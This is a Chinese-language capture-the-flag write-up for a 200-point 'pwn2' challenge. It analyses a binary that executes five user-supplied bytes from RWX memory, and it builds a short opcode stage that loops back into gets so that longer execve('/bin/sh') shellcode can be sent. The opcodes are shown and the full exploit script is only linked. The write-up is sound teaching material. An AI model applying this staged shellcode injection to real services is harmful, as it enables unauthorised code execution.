## pwn2 (pwn, 200p)

提供了以下文件：  
[pwn2](./pwn2)

---------------------------------------

### 0x1 分析程序
用IDA看下伪代码：

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // eax@1
  char *v4; // ST28_4@1
  const char *v5; // ST2C_4@1

  v3 = mmap((void *)0x31337000, 4096u, 7, 34, 0, 0);
  v4 = (char *)v3;
  v5 = (char *)v3 + 4090;
  gets((char *)v3 + 4090);
  strncpy(v4, v5, 5u);
  return ((int (*)(void))v4)();
}
```

程序逻辑十分简单，如下。用`mmap`分配了块4096个字节的可写可读可执行的内存块。用'gets'读入6个字节，但其实只有5个可以控制，第六个为`\n`，超过6个字节报错。之后把这前5个字节copy到内存块头，并执行。看到这里，就知道关键在于输入的5个字节。这5个字节的要完成什么功能呢？


### 0x2 构造exp
看下程序的汇编代码：

```
.text:0804847D                 push    ebp
.text:0804847E                 mov     ebp, esp
.text:08048480                 and     esp, 0FFFFFFF0h
.text:08048483                 sub     esp, 30h
.text:08048486                 mov     dword ptr [esp+14h], 0 ; offset
.text:0804848E                 mov     dword ptr [esp+10h], 0 ; fd
.text:08048496                 mov     dword ptr [esp+0Ch], 22h ; flags
.text:0804849E                 mov     dword ptr [esp+8], 7 ; prot
.text:080484A6                 mov     dword ptr [esp+4], 1000h ; len
.text:080484AE                 mov     dword ptr [esp], 31337000h ; addr
.text:080484B5                 call    _mmap
.text:080484BA                 mov     [esp+28h], eax
.text:080484BE                 mov     eax, [esp+28h]
.text:080484C2                 add     eax, 0FFAh
.text:080484C7                 mov     [esp+2Ch], eax
.text:080484CB                 mov     eax, [esp+2Ch]
.text:080484CF                 mov     [esp], eax      ; s
.text:080484D2                 call    _gets
.text:080484D7                 mov     dword ptr [esp+8], 5 ; n
.text:080484DF                 mov     eax, [esp+2Ch]
.text:080484E3                 mov     [esp+4], eax    ; src
.text:080484E7                 mov     eax, [esp+28h]
.text:080484EB                 mov     [esp], eax      ; dest
.text:080484EE                 call    _strncpy
.text:080484F3                 mov     eax, [esp+28h]
.text:080484F7                 call    eax
.text:080484F9                 leave
.text:080484FA                 retn
.text:080484FA main            endp
```
首先我们看到只有5个字节肯定是完成不了exploit的，必须让它输入更多的opcode。所以考虑要跳转到`gets`语句，让我们可以输入更多的opcode。假如`gets`参数如果还是`0x31337FFA`(0x31337000+4090)的话，那没有变化，还是只能输入5个字节。要想办法可以输入更多的字节，我们看下执行后`.text:080484F7  call eax` 后栈的情况：

```
esp+0   ->    0x080484F9    ; return address
esp+4         0x31337000    ; strncpy的第一个参数 
esp+8         0x31337FFA    ; strncpy的第二个参数
esp+0c        0x00000005    ; strncpy的第三个参数
```

如果把0x080484F9当`gets`的参数，那么执行将报错，因为`.text`段不可写。但是如果把`0x31337000`当做`gets`的参数，那么是非常好的事情，这样我们可以输入4095个字节的opcode，而且还是可执行的。按照这思路，要把EIP变为`0x080484D2`，并且esp+4。发现`0x080484F9`和`0x080484D2`只有最低的字节不同，是否可以改变下，然后再来个`ret`呢？借助pwntools的`asm`指令，我们得到这个功能的opcode，正好它也是5个字节长度，nice。

```
$ asm "mov byte ptr [esp], 0xd2; ret"
c60424d2c3

$ asm "sub dword ptr [esp], 0x27; ret"
832c2427c3
```

之后，我们可以输入`execve ("/bin/sh")`的shellcode，并执行即可。详细代码请看[pwn2_exp.py](./pwn2_exp.py)


